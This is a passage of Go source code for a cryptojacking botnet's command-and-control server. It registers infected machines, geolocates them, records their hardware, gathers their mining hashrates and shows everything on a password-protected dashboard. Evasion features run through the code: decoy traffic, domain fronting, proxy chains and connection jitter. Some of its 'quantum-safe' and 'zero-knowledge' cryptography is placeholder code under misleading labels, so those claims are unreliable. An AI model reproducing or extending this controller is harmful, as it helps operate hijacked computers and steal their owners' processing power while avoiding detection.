	return nil // Placeholder - implement with CGO or platform-specific build tags
}

func (sm *SecureMemory) SecureFree(data []byte) {
	sm.mutex.Lock()
	defer sm.mutex.Unlock()

	ptr := uintptr(unsafe.Pointer(&data[0]))
	size, exists := sm.regions[ptr]
	if !exists {
		return
	}

	// Multi-pass secure overwrite (DoD 5220.22-M)
	for pass := 0; pass < sm.scrubPasses; pass++ {
		var pattern byte
		switch pass {
		case 0:
			pattern = 0x00 // First pass: zeros
		case 1:
			pattern = 0xFF // Second pass: ones
		default:
			// Subsequent passes: cryptographically secure random
			randomBytes := make([]byte, 1)
			if _, err := rand.Read(randomBytes); err != nil {
				pattern = byte((pass * 37) % 256) // Fallback pattern
			} else {
				pattern = randomBytes[0]
			}
		}

		for i := range data {
			data[i] = pattern
		}
		runtime.KeepAlive(data) // Prevent optimization
	}

	// Unlock memory
	sm.unlockMemory(ptr, size)
	delete(sm.regions, ptr)
}

func (sm *SecureMemory) unlockMemory(ptr uintptr, size int) {
	if runtime.GOOS == "windows" {
		kernel32 := syscall.NewLazyDLL("kernel32.dll")
		virtualUnlock := kernel32.NewProc("VirtualUnlock")
		virtualUnlock.Call(ptr, uintptr(size))
	} else {
		// Unix munlock implementation (simplified for cross-platform compatibility)
		// In production, use platform-specific syscalls
	}
}

func (sm *SecureMemory) StartPeriodicScrub() {
	ticker := time.NewTicker(10 * time.Minute)
	defer ticker.Stop()

	for range ticker.C {
		sm.periodicScrub()
	}
}

func (sm *SecureMemory) periodicScrub() {
	runtime.GC()
	runtime.GC() // Double GC to ensure cleanup
}

func (sm *SecureMemory) EmergencyScrub() {
	sm.mutex.Lock()
	defer sm.mutex.Unlock()

	// Force garbage collection
	runtime.GC()
	runtime.GC()

	// Clear all tracked secure regions
	for ptr, size := range sm.regions {
		sm.unlockMemory(ptr, size)
	}
	sm.regions = make(map[uintptr]int)
}

// Quantum-Safe Authentication Implementation
func (qa *QuantumSafeAuth) GenerateQuantumSafeKeys() {
	qa.mutex.Lock()
	defer qa.mutex.Unlock()

	// Generate quantum-resistant key pair (placeholder for CRYSTALS-Kyber)
	qa.publicKey = make([]byte, QUANTUM_SAFE_KEY_SIZE)
	qa.privateKey = make([]byte, QUANTUM_SAFE_KEY_SIZE*2)
	qa.keyExchange = make([]byte, QUANTUM_SAFE_KEY_SIZE)

	rand.Read(qa.publicKey)
	rand.Read(qa.privateKey)
	rand.Read(qa.keyExchange)

	auditLogger.LogEvent("QUANTUM_AUTH", "SYSTEM", "", "", "KEYGEN", "SUCCESS", "", "INFO")
}

func (qa *QuantumSafeAuth) PerformKeyExchange(peerPublicKey []byte) ([]byte, error) {
	qa.mutex.RLock()
	defer qa.mutex.RUnlock()

	// Quantum-safe key exchange (placeholder implementation)
	sharedSecret := make([]byte, QUANTUM_SAFE_KEY_SIZE)

	// Combine keys using secure hash
	hasher, _ := blake2b.New(QUANTUM_SAFE_KEY_SIZE, qa.privateKey)
	hasher.Write(peerPublicKey)
	hasher.Write(qa.keyExchange)
	copy(sharedSecret, hasher.Sum(nil))

	return sharedSecret, nil
}

// Load proxy chain from environment configuration
func loadProxyChain() []string {
	proxyConfig := os.Getenv("PROXY_CHAIN")
	if proxyConfig == "" {
		return []string{}
	}

	// Parse comma-separated proxy list
	proxies := strings.Split(proxyConfig, ",")
	var validProxies []string

	for _, proxy := range proxies {
		proxy = strings.TrimSpace(proxy)
		if proxy != "" {
			validProxies = append(validProxies, proxy)
		}
	}

	return validProxies
}

// Network Obfuscator Implementation
func (no *NetworkObfuscator) StartTrafficMixing() {
	ticker := time.NewTicker(no.trafficMixer.flushInterval)
	defer ticker.Stop()

	for {
		select {
		case decoy := <-no.trafficMixer.decoyTraffic:
			no.trafficMixer.mixingBuffer = append(no.trafficMixer.mixingBuffer, decoy)

		case <-ticker.C:
			no.flushMixingBuffer()
		}
	}
}

func (no *NetworkObfuscator) GenerateDecoyTraffic() {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()

	for range ticker.C {
		// Generate realistic decoy traffic
		decoySize := 100 + (time.Now().UnixNano() % 900) // 100-1000 bytes
		decoyData := make([]byte, decoySize)
		rand.Read(decoyData)

		select {
		case no.trafficMixer.decoyTraffic <- decoyData:
		default:
			// Buffer full, skip this decoy
		}
	}
}

func (no *NetworkObfuscator) flushMixingBuffer() {
	no.mutex.Lock()
	defer no.mutex.Unlock()

	if len(no.trafficMixer.mixingBuffer) == 0 {
		return
	}

	// Shuffle buffer contents
	for i := range no.trafficMixer.mixingBuffer {
		j := mathrand.Intn(i + 1)
		no.trafficMixer.mixingBuffer[i], no.trafficMixer.mixingBuffer[j] =
			no.trafficMixer.mixingBuffer[j], no.trafficMixer.mixingBuffer[i]
	}

	// Clear buffer
	no.trafficMixer.mixingBuffer = no.trafficMixer.mixingBuffer[:0]
}

func (no *NetworkObfuscator) CreateObfuscatedConnection(address string) (net.Conn, error) {
	no.mutex.RLock()
	defer no.mutex.RUnlock()

	// Use domain fronting if available
	if len(no.domainFronts) > 0 {
		frontDomain := no.domainFronts[mathrand.Intn(len(no.domainFronts))]
		// Implementation would modify Host header to front domain
		_ = frontDomain
	}

	// Use proxy chain if configured
	if len(no.proxyChain) > 0 {
		return no.connectThroughProxy(address)
	}

	return net.Dial("tcp", address)
}

func (no *NetworkObfuscator) connectThroughProxy(address string) (net.Conn, error) {
	// SOCKS5 proxy chain implementation
	proxyAddr := no.proxyChain[0] // Use first proxy in chain
	dialer, err := proxy.SOCKS5("tcp", proxyAddr, nil, proxy.Direct)
	if err != nil {
		return nil, err
	}

	return dialer.Dial("tcp", address)
}

// Zero-Knowledge Authentication Implementation
func (zka *ZeroKnowledgeAuth) GenerateCommitment(secret []byte) error {
	// Generate random commitment
	zka.commitment = make([]byte, 64)
	rand.Read(zka.commitment)

	// Hash secret with commitment
	hasher := sha512.New()
	hasher.Write(secret)
	hasher.Write(zka.commitment)

	return nil
}

func (zka *ZeroKnowledgeAuth) CreateChallenge() []byte {
	zka.challenge = make([]byte, 32)
	rand.Read(zka.challenge)
	return zka.challenge
}

func (zka *ZeroKnowledgeAuth) ComputeResponse(secret []byte) []byte {
	hasher := sha512.New()
	hasher.Write(secret)
	hasher.Write(zka.commitment)
	hasher.Write(zka.challenge)

	zka.response = hasher.Sum(nil)
	return zka.response
}

func (zka *ZeroKnowledgeAuth) VerifyResponse(expectedSecret []byte) bool {
	hasher := sha512.New()
	hasher.Write(expectedSecret)
	hasher.Write(zka.commitment)
	hasher.Write(zka.challenge)

	expected := hasher.Sum(nil)
	zka.verified = subtle.ConstantTimeCompare(expected, zka.response) == 1
	return zka.verified
}

// Enhanced secure error handling that prevents information disclosure
func secureError(operation string, err error) error {
	if err == nil {
		return nil
	}

	// Log detailed error internally for debugging
	auditLogger.LogEvent("ERROR", "SYSTEM", "", "", operation, "FAILURE", err.Error(), "ERROR")

	// Return generic error to prevent information disclosure
	return fmt.Errorf("operation failed: %s", operation)
}

func encryptCommandMilitary(command string, key []byte) ([]byte, error) {
	// Use ChaCha20-Poly1305 for quantum resistance preparation
	aead, err := chacha20poly1305.NewX(key[:32]) // ChaCha20 needs 32-byte key
	if err != nil {
		return nil, secureError("cipher_creation", err)
	}

	nonce := make([]byte, aead.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, secureError("nonce_generation", err)
	}

	ciphertext := aead.Seal(nonce, nonce, []byte(command), nil)
	return ciphertext, nil
}

func decryptCommandMilitary(ciphertext []byte, key []byte) (string, error) {
	aead, err := chacha20poly1305.NewX(key[:32])
	if err != nil {
		return "", secureError("cipher_creation", err)
	}

	if len(ciphertext) < aead.NonceSize() {
		return "", secureError("invalid_ciphertext_length", fmt.Errorf("insufficient data"))
	}

	nonce, ciphertext := ciphertext[:aead.NonceSize()], ciphertext[aead.NonceSize():]
	plaintext, err := aead.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return "", secureError("decryption", err)
	}

	return string(plaintext), nil
}

// Enhanced HMAC with BLAKE2b for quantum resistance
func generateHMACMilitary(data []byte, key []byte) []byte {
	h, _ := blake2b.New512(key)
	h.Write(data)
	return h.Sum(nil)
}

func verifyHMACMilitary(data []byte, receivedMAC []byte, key []byte) bool {
	expectedMAC := generateHMACMilitary(data, key)
	return subtle.ConstantTimeCompare(receivedMAC, expectedMAC) == 1
}

func main() {
	// Initialize security components
	initSecurityComponents()

	if !fileExists(CERT_FILE) || !fileExists(KEY_FILE) {
		generatePKICertificates()
	}
	if !fileExists(USERS_FILE) {
		createRootUser()
	}

	// Start security services
	go auditLogger.Start()
	go keyRotationManager.Start()
	go sessionManager.StartCleanup()

	go startBotServer()
	go startBotCleanup()
	go cleanupLoginAttempts()
	startWebServer()
}

func fileExists(filename string) bool {
	_, err := os.Stat(filename)
	return err == nil
}

func generateSelfSignedCert() {
	cert := &x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject: pkix.Name{
			CommonName: "localhost",
		},
		NotBefore:             time.Now(),
		NotAfter:              time.Now().AddDate(1, 0, 0),
		KeyUsage:              x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
		BasicConstraintsValid: true,
	}
	priv, _ := rsa.GenerateKey(rand.Reader, 2048)
	certBytes, _ := x509.CreateCertificate(rand.Reader, cert, cert, &priv.PublicKey, priv)
	certOut, _ := os.Create(CERT_FILE)
	pem.Encode(certOut, &pem.Block{Type: "CERTIFICATE", Bytes: certBytes})
	certOut.Close()
	keyOut, _ := os.OpenFile(KEY_FILE, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
	pem.Encode(keyOut, &pem.Block{Type: "RSA PRIVATE KEY", Bytes: x509.MarshalPKCS1PrivateKey(priv)})
	keyOut.Close()
}

func generateChallenge() string {
	b := make([]byte, 16)
	rand.Read(b)
	challenge := fmt.Sprintf("%x", b)
	saltLock.Lock()
	salts[challenge] = randomString(32)
	saltLock.Unlock()
	return challenge
}

func handleWebSocket(w http.ResponseWriter, r *http.Request) {
	ws, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	defer ws.Close()
	ws.SetReadDeadline(time.Now().Add(pongWait))
	ws.SetPongHandler(func(string) error {
		ws.SetReadDeadline(time.Now().Add(pongWait))
		return nil
	})
	ticker := time.NewTicker(pingPeriod)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			ws.SetWriteDeadline(time.Now().Add(writeWait))
			if err := ws.WriteMessage(websocket.PingMessage, nil); err != nil {
				return
			}
		default:
			botCountLock.Lock()
			currentBots := getBots()
			var activeMiners int
			var totalHashrate float64
			var miningStats []MinerReport

			for _, b := range currentBots {
				if time.Since(b.LastHeartbeat) <= 2*heartbeatInterval {
					if b.IsMining {
						activeMiners++
						totalHashrate += b.MinerStats.Hashrate
						miningStats = append(miningStats, MinerReport{
							BotIP:      b.IP,
							Hashrate:   b.MinerStats.Hashrate,
							LastUpdate: b.MinerStats.LastUpdate,
						})
					}
				}
			}
			botCountLock.Unlock()

			metrics := Metrics{
				BotCount:      len(currentBots),
				ActiveMiners:  activeMiners,
				TotalHashrate: totalHashrate,
				Bots:          currentBots,
				MiningStats:   miningStats,
			}

			ws.SetWriteDeadline(time.Now().Add(writeWait))
			if err := ws.WriteJSON(metrics); err != nil {
				return
			}
			time.Sleep(1 * time.Second)
		}
	}
}

func sendChallenge(conn net.Conn) (string, error) {
	challenge := generateChallenge()
	saltLock.Lock()
	salt := salts[challenge]
	saltLock.Unlock()
	fullChallenge := fmt.Sprintf("%s:%s", challenge, salt)
	_, err := fmt.Fprintf(conn, "CHALLENGE:%s\n", fullChallenge)
	return challenge, err
}

func verifyResponse(conn net.Conn, challenge string) (bool, error) {
	reader := bufio.NewReader(conn)
	response, err := reader.ReadString('\n')
	if err != nil {
		return false, err
	}
	saltLock.Lock()
	salt, exists := salts[challenge]
	saltLock.Unlock()
	if !exists {
		return false, nil
	}
	return strings.TrimSpace(response) == fmt.Sprintf("%x", sha256.Sum256([]byte(challenge+salt))), nil
}

func createRootUser() {
	rootUser := User{
		Username:  "root",
		Password:  randomString(12),
		Expire:    time.Now().AddDate(1, 0, 0),
		Level:     "Owner",
		CreatedAt: time.Now(),
	}
	bytes, _ := json.MarshalIndent([]User{rootUser}, "", "  ")
	os.WriteFile(USERS_FILE, bytes, 0600)
}

func randomString(length int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, length)
	for i := range b {
		n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(chars))))
		b[i] = chars[n.Int64()]
	}
	return string(b)
}

func getGeoLocation(ip string) (country, city, region string, lat, lon float64, err error) {
	if ip == "127.0.0.1" || ip == "::1" || ip == "localhost" {
		return "Local", "Local Network", "Internal", 0, 0, nil
	}
	host, _, _ := net.SplitHostPort(ip)
	ip = host
	resp, err := http.Get(fmt.Sprintf("http://www.geoplugin.net/json.gp?ip=%s", ip))
	if err != nil {
		return "", "", "", 0, 0, err
	}
	defer resp.Body.Close()
	var data struct {
		Country   string  `json:"geoplugin_countryName"`
		City      string  `json:"geoplugin_city"`
		Region    string  `json:"geoplugin_regionName"`
		Latitude  float64 `json:"geoplugin_latitude,string"`
		Longitude float64 `json:"geoplugin_longitude,string"`
		Error     bool    `json:"error"`
	}
	json.NewDecoder(resp.Body).Decode(&data)
	if data.Error {
		return "", "", "", 0, 0, nil
	}
	return data.Country, data.City, data.Region, data.Latitude, data.Longitude, nil
}

func startBotServer() {
	// Load CA certificate for client verification
	caCertPEM, err := os.ReadFile(CA_CERT_FILE)
	if err != nil {
		log.Fatalf("Failed to read CA certificate: %v", err)
	}
	caCertPool := x509.NewCertPool()
	caCertPool.AppendCertsFromPEM(caCertPEM)

	cert, err := tls.LoadX509KeyPair(CERT_FILE, KEY_FILE)
	if err != nil {
		log.Fatalf("Failed to load server certificate: %v", err)
	}

	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{cert},
		ClientAuth:   tls.RequireAndVerifyClientCert,
		ClientCAs:    caCertPool,
		MinVersion:   tls.VersionTLS13,
		MaxVersion:   tls.VersionTLS13, // Force TLS 1.3 only
		CipherSuites: []uint16{
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
		},
		CurvePreferences: []tls.CurveID{
			tls.X25519,    // Quantum-resistant curve
			tls.CurveP384, // High-security curve
		},
		SessionTicketsDisabled: true,
		Renegotiation:          tls.RenegotiateNever,
		// Enhanced security settings
		InsecureSkipVerify: false,
		VerifyConnection: func(cs tls.ConnectionState) error {
			// Implement certificate pinning
			if len(cs.PeerCertificates) > 0 {
				return certPinner.VerifyPinnedCert("client", cs.PeerCertificates[0])
			}
			return fmt.Errorf("no peer certificates provided")
		},
		GetConfigForClient: func(hello *tls.ClientHelloInfo) (*tls.Config, error) {
			// Dynamic server name verification (remove hardcoded localhost)
			serverNames := []string{
				os.Getenv("SERVER_NAME"),
				"secure-server.local",
				"command-control.internal",
			}

			for _, name := range serverNames {
				if name != "" && hello.ServerName == name {
					return nil, nil // Use default config
				}
			}

			auditLogger.LogEvent("TLS", "", hello.Conn.RemoteAddr().String(), "",
				"INVALID_SNI", "FAILURE", fmt.Sprintf("SNI: %s", hello.ServerName), "WARNING")
			return nil, fmt.Errorf("invalid server name: %s", hello.ServerName)
		},
	}

	listener, err := tls.Listen("tcp", fmt.Sprintf("%s:%s", BOT_SERVER_IP, BOT_SERVER_PORT), tlsConfig)
	if err != nil {
		log.Fatalf("Failed to start bot server: %v", err)
	}
	defer listener.Close()

	auditLogger.LogEvent("SERVER", "SYSTEM", "", "", "BOT_SERVER_START", "SUCCESS", "", "INFO")

	for {
		conn, err := listener.Accept()
		if err != nil {
			auditLogger.LogEvent("CONNECTION", "", "", "", "ACCEPT_ERROR", "FAILURE", err.Error(), "ERROR")
			continue
		}
		go handleSecureBotConnection(conn)
	}
}

func handleSecureBotConnection(conn net.Conn) {
	if !botConnLimiter.Allow() {
		conn.Close()
		auditLogger.LogEvent("CONNECTION", "", "", conn.RemoteAddr().String(), "RATE_LIMITED", "BLOCKED", "", "WARNING")
		return
	}

	defer func() {
		conn.Close()
		decrementBotCount()
		removeBot(conn)
	}()

	// Verify client certificate
	tlsConn, ok := conn.(*tls.Conn)
	if !ok {
		auditLogger.LogEvent("CONNECTION", "", "", conn.RemoteAddr().String(), "INVALID_TLS", "FAILURE", "", "ERROR")
		return
	}

	err := tlsConn.Handshake()
	if err != nil {
		auditLogger.LogEvent("CONNECTION", "", "", conn.RemoteAddr().String(), "HANDSHAKE_FAILED", "FAILURE", err.Error(), "ERROR")
		return
	}

	clientCerts := tlsConn.ConnectionState().PeerCertificates
	if len(clientCerts) == 0 {
		auditLogger.LogEvent("CONNECTION", "", "", conn.RemoteAddr().String(), "NO_CLIENT_CERT", "FAILURE", "", "ERROR")
		return
	}

	clientCert := clientCerts[0]

	// Perform enhanced challenge-response authentication
	if !performMutualAuthentication(conn, clientCert) {
		auditLogger.LogEvent("AUTHENTICATION", "", "", conn.RemoteAddr().String(), "MUTUAL_AUTH_FAILED", "FAILURE", "", "ERROR")
		return
	}

	ip, _, _ := net.SplitHostPort(conn.RemoteAddr().String())
	botID := fmt.Sprintf("%x", sha256.Sum256([]byte(clientCert.SerialNumber.String()+ip)))

	// Generate session key for this bot
	sessionKey := make([]byte, SESSION_KEY_SIZE)
	rand.Read(sessionKey)

	newBot := Bot{
		Conn:            conn,
		IP:              ip,
		Time:            time.Now(),
		LastHeartbeat:   time.Now(),
		SessionKey:      sessionKey,
		ClientCert:      clientCert,
		Authenticated:   true,
		LastKeyRotation: time.Now(),
	}

	country, city, region, lat, lon, err := getGeoLocation(ip)
	if err == nil {
		newBot.Country = country
		newBot.City = city
		newBot.Region = region
		newBot.Latitude = lat
		newBot.Longitude = lon
	}

	botCountLock.Lock()
	bots = append(bots, newBot)
	botCount = len(bots)
	botConns = append(botConns, &conn)
	botCountLock.Unlock()

	auditLogger.LogEvent("CONNECTION", "", botID, ip, "BOT_CONNECTED", "SUCCESS", "", "INFO")

	// Add anti-fingerprinting jitter
	addJitter()

	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		data := scanner.Bytes()

		// Deobfuscate traffic
		deobfuscated, err := deobfuscateTraffic(data)
		if err != nil {
			auditLogger.LogEvent("COMMUNICATION", "", botID, ip, "DEOBFUSCATION_FAILED", "FAILURE", err.Error(), "WARNING")
			continue
		}

		conn.SetDeadline(time.Now().Add(heartbeatInterval * 2))

		if err := handleSecureMessage(conn, deobfuscated, &newBot); err != nil {
			auditLogger.LogEvent("COMMUNICATION", "", botID, ip, "MESSAGE_PROCESSING_FAILED", "FAILURE", err.Error(), "WARNING")
		}
	}
}

func performMutualAuthentication(conn net.Conn, clientCert *x509.Certificate) bool {
	// Enhanced challenge-response with multiple rounds
	for round := 0; round < 3; round++ {
		challenge := generateSecureChallenge()

		// Send challenge
		challengeData := fmt.Sprintf("CHALLENGE_V2:%d:%s\n", round, challenge)
		if _, err := conn.Write([]byte(challengeData)); err != nil {
			return false
		}

		// Read response
		reader := bufio.NewReader(conn)
		responseLine, err := reader.ReadString('\n')
		if err != nil {
			return false
		}

		// Verify response
		if !verifySecureResponse(strings.TrimSpace(responseLine), challenge, clientCert, round) {
			return false
		}
	}
	return true
}

func generateSecureChallenge() string {
	challengeBytes := make([]byte, 32)
	rand.Read(challengeBytes)
	timestamp := time.Now().Unix()

	challenge := fmt.Sprintf("%x:%d", challengeBytes, timestamp)

	// Store challenge with expiration
	saltLock.Lock()
	salts[challenge] = randomString(64)
	saltLock.Unlock()

	// Clean expired challenges
	go func() {
		time.Sleep(30 * time.Second)
		saltLock.Lock()
		delete(salts, challenge)
		saltLock.Unlock()
	}()

	return challenge
}

func verifySecureResponse(response, challenge string, clientCert *x509.Certificate, round int) bool {
	saltLock.Lock()
	salt, exists := salts[challenge]
	saltLock.Unlock()

	if !exists {
		return false
	}

	// Multi-factor verification
	certFingerprint := fmt.Sprintf("%x", sha256.Sum256(clientCert.Raw))

	expectedResponse := fmt.Sprintf("%x", sha512.Sum512([]byte(
		challenge+salt+certFingerprint+fmt.Sprintf("%d", round),
	)))

	return subtle.ConstantTimeCompare([]byte(response), []byte(expectedResponse)) == 1
}

func handleSecureMessage(conn net.Conn, data []byte, bot *Bot) error {
	// Decrypt message using military-grade ChaCha20-Poly1305
	decryptedData, err := decryptCommandMilitary(data, bot.SessionKey)
	if err != nil {
		return fmt.Errorf("decryption failed: %w", err)
	}

	// Parse secure command
	var secureCmd SecureCommand
	if err := json.Unmarshal([]byte(decryptedData), &secureCmd); err != nil {
		return fmt.Errorf("invalid command format: %w", err)
	}

	// Verify timestamp (prevent replay attacks)
	if time.Since(secureCmd.Timestamp) > 30*time.Second {
		return fmt.Errorf("command timestamp too old")
	}

	// Verify HMAC signature using military-grade BLAKE2b
	cmdData := []byte(secureCmd.Command + secureCmd.Nonce + secureCmd.Timestamp.Format(time.RFC3339))
	receivedSig, err := hex.DecodeString(secureCmd.Signature)
	if err != nil || !verifyHMACMilitary(cmdData, receivedSig, hmacKey) {
		return fmt.Errorf("invalid signature")
	}

	botID := fmt.Sprintf("%x", sha256.Sum256([]byte(bot.ClientCert.SerialNumber.String()+bot.IP)))

	switch {
	case strings.HasPrefix(secureCmd.Command, "PONG:"):
		parts := strings.Split(secureCmd.Command, ":")
		if len(parts) >= 4 {
			updateBotInfo(conn, parts[1], parts[2], parts[3])
		}
		auditLogger.LogEvent("HEARTBEAT", "", botID, bot.IP, "PONG_RECEIVED", "SUCCESS", "", "DEBUG")

	case strings.HasPrefix(secureCmd.Command, "HEARTBEAT:"):
		parts := strings.Split(secureCmd.Command, ":")
		if len(parts) >= 4 {
			updateBotInfo(conn, parts[1], parts[2], parts[3])
		}
		updateBotHeartbeat(conn)
		auditLogger.LogEvent("HEARTBEAT", "", botID, bot.IP, "HEARTBEAT_RECEIVED", "SUCCESS", "", "DEBUG")

	case strings.HasPrefix(secureCmd.Command, "MINER_REPORT:"):
		updateMinerStats(conn, secureCmd.Command)
		auditLogger.LogEvent("MINING", "", botID, bot.IP, "MINER_REPORT_RECEIVED", "SUCCESS", "", "INFO")

	default:
		auditLogger.LogEvent("COMMUNICATION", "", botID, bot.IP, "UNKNOWN_COMMAND", "WARNING", secureCmd.Command, "WARNING")
		return fmt.Errorf("unknown command: %s", secureCmd.Command)
	}

	return nil
}

func updateMinerStats(conn net.Conn, report string) {
	parts := strings.SplitN(strings.TrimPrefix(report, "MINER_REPORT:"), ":", 5)
	if len(parts) != 5 {
		return
	}
	hashrate, _ := strconv.ParseFloat(parts[0], 64)
	accepted, _ := strconv.ParseInt(parts[1], 10, 64)
	rejected, _ := strconv.ParseInt(parts[2], 10, 64)
	totalHashes, _ := strconv.ParseInt(parts[3], 10, 64)
	uptime, _ := strconv.ParseFloat(parts[4], 64)

	botCountLock.Lock()
	defer botCountLock.Unlock()

	for i, bot := range bots {
		if bot.Conn == conn {
			bots[i].MinerStats = MinerStats{
				Hashrate:    hashrate,
				Accepted:    accepted,
				Rejected:    rejected,
				TotalHashes: totalHashes,
				Uptime:      uptime,
				LastUpdate:  time.Now(),
			}
			bots[i].IsMining = true
			break
		}
	}
}

func updateBotInfo(conn net.Conn, arch, coresStr, ramStr string) {
	botCountLock.Lock()
	defer botCountLock.Unlock()

	for i, b := range bots {
		if b.Conn == conn {
			bots[i].Arch = arch
			if cores, err := strconv.Atoi(coresStr); err == nil {
				bots[i].Cores = cores
			}
			if ram, err := strconv.ParseFloat(ramStr, 64); err == nil {
				bots[i].RAM = ram
			}
			break
		}
	}
}

func updateBotHeartbeat(conn net.Conn) {
	botCountLock.Lock()
	defer botCountLock.Unlock()

	for i, b := range bots {
		if b.Conn == conn {
			bots[i].LastHeartbeat = time.Now()
			break
		}
	}
}

func removeBot(conn net.Conn) {
	botCountLock.Lock()
	defer botCountLock.Unlock()

	for i, b := range bots {
		if b.Conn == conn {
			bots = append(bots[:i], bots[i+1:]...)
			break
		}
	}

	for i, botConn := range botConns {
		if *botConn == conn {
			botConns = append(botConns[:i], botConns[i+1:]...)
			break
		}
	}
	botCount = len(bots)
}

func startBotCleanup() {
	ticker := time.NewTicker(botCleanupInterval)
	defer ticker.Stop()

	for range ticker.C {
		cleanupStaleBots()
	}
}

func cleanupStaleBots() {
	botCountLock.Lock()
	defer botCountLock.Unlock()

	threshold := 2 * heartbeatInterval
	var activeBots []Bot

	for _, b := range bots {
		if time.Since(b.LastHeartbeat) <= threshold {
			activeBots = append(activeBots, b)
		} else if b.Conn != nil {
			b.Conn.Close()
		}
	}

	bots = activeBots
	botCount = len(bots)
}

func cleanupLoginAttempts() {
	ticker := time.NewTicker(loginWindow)
	defer ticker.Stop()

	for range ticker.C {
		loginLock.Lock()
		loginAttempts = make(map[string]int)
		loginLock.Unlock()
	}
}

func checkLoginAttempts(ip string) bool {
	loginLock.Lock()
	defer loginLock.Unlock()
	attempts, exists := loginAttempts[ip]
	if !exists {
		loginAttempts[ip] = 1
		return true
	}
	if attempts >= maxLoginAttempts {
		return false
	}
	loginAttempts[ip]++
	return true
}

func uptimeHours(startTime time.Time) float64 {
	return time.Since(startTime).Hours()
}

func startWebServer() {
	funcMap := template.FuncMap{
		"div": func(a, b int) int {
			if b == 0 {
				return 0
			}
			return a / b
		},
		"mul": func(a, b int) int {
			return a * b
		},
		"and": func(a, b bool) bool {
			return a && b
		},
		"substr": func(s string, start, length int) string {
			if start >= len(s) {
				return ""
			}
			end := start + length
			if end > len(s) {
				end = len(s)
			}
			return s[start:end]
		},
		"upper": func(s string) string {
			return strings.ToUpper(s)
		},
		"uptimeHours": uptimeHours,
		"formatTime":  func(t time.Time) string { return t.Format(time.RFC3339) },
		"now":         func() time.Time { return time.Now() },
		"sub":         func(a, b uint64) uint64 { return a - b },
		"formatGB":    func(bytes uint64) float64 { return float64(bytes) / 1073741824.0 },
		"isActive": func(lastHeartbeat time.Time) bool {
			return time.Since(lastHeartbeat) <= 2*heartbeatInterval
		},
	}

	tmpl, err := template.New("").Funcs(funcMap).ParseGlob("views-folder/*.html")
	if err != nil {
		log.Fatalf("Error loading templates: %v", err)
	}

	server := &http.Server{
		Addr: fmt.Sprintf("%s:%s", WEB_SERVER_IP, WEB_SERVER_PORT),
		TLSConfig: &tls.Config{
			MinVersion:               tls.VersionTLS13,
			PreferServerCipherSuites: true,
			CurvePreferences: []tls.CurveID{
				tls.X25519,
				tls.CurveP256,
			},
			CipherSuites: []uint16{
				tls.TLS_AES_128_GCM_SHA256,
				tls.TLS_AES_256_GCM_SHA384,
				tls.TLS_CHACHA20_POLY1305_SHA256,
			},
			SessionTicketsDisabled: true,
		},
	}

	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/" {
			http.Redirect(w, r, "/", http.StatusSeeOther)
			return
		}
		sessionID := getSessionCookie(r)
		if _, exists := getSession(sessionID); exists {
			http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
			return
		}
		tmpl.ExecuteTemplate(w, "login.html", nil)
	})

	http.HandleFunc("/ws", requireAuth(
		func(w http.ResponseWriter, r *http.Request, user User) {
			handleWebSocket(w, r)
		}))

	http.HandleFunc("/login", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != "POST" {
			http.Redirect(w, r, "/", http.StatusSeeOther)
			return
		}

		ip := r.RemoteAddr
		if host, _, err := net.SplitHostPort(ip); err == nil {
			ip = host
		}

		if !checkLoginAttempts(ip) {
			auditLogger.LogEvent("AUTHENTICATION", "", "", ip, "LOGIN_RATE_LIMITED", "BLOCKED", "", "WARNING")
			http.Redirect(w, r, "/?flash=Too many login attempts", http.StatusSeeOther)
			return
		}

		username := r.FormValue("username")
		password := r.FormValue("password")

		if exists, user := authUser(username, password); exists {
			newSessionID := randomString(64)
			oldSessionID := getSessionCookie(r)
			if oldSessionID != "" {
				clearSession(oldSessionID)
			}
			setSession(newSessionID, *user)

			// Create secure session
			sessionManager.mutex.Lock()
			sessionKey := make([]byte, SESSION_KEY_SIZE)
			hmacKey := make([]byte, HMAC_KEY_SIZE)
			rand.Read(sessionKey)
			rand.Read(hmacKey)

			sessionManager.sessions[newSessionID] = &SecureSession{
				ID:            newSessionID,
				UserID:        username,
				CreatedAt:     time.Now(),
				LastAccess:    time.Now(),
				EncryptionKey: sessionKey,
				HMACKey:       hmacKey,
				IPAddress:     ip,
				UserAgent:     r.UserAgent(),
			}
			sessionManager.mutex.Unlock()

			http.SetCookie(w, &http.Cookie{
				Name:     "session",
				Value:    newSessionID,
				Path:     "/",
				Secure:   true,
				HttpOnly: true,
				MaxAge:   3600,
				SameSite: http.SameSiteStrictMode,
			})

			auditLogger.LogEvent("AUTHENTICATION", username, "", ip, "LOGIN_SUCCESS", "SUCCESS", "", "INFO")
			http.Redirect(w, r, "/dashboard", http.StatusSeeOther)
			return
		}

		auditLogger.LogEvent("AUTHENTICATION", username, "", ip, "LOGIN_FAILED", "FAILURE", "Invalid credentials", "WARNING")
		http.Redirect(w, r, "/?flash=Invalid credentials", http.StatusSeeOther)
	})

	http.HandleFunc("/dashboard", requireAuth(
		func(w http.ResponseWriter, r *http.Request, user User) {
			activeMiners := 0
			totalHashrate := 0.0
			var miningStats []MinerReport
			currentBots := getBots()

			for _, b := range currentBots {
				if b.IsMining {
					activeMiners++
					totalHashrate += b.MinerStats.Hashrate
					miningStats = append(miningStats, MinerReport{
						BotIP:      b.IP,
						Hashrate:   b.MinerStats.Hashrate,
						LastUpdate: b.MinerStats.LastUpdate,
					})
				}
			}

			data := DashboardData{
				User:            user,
				BotCount:        len(currentBots),
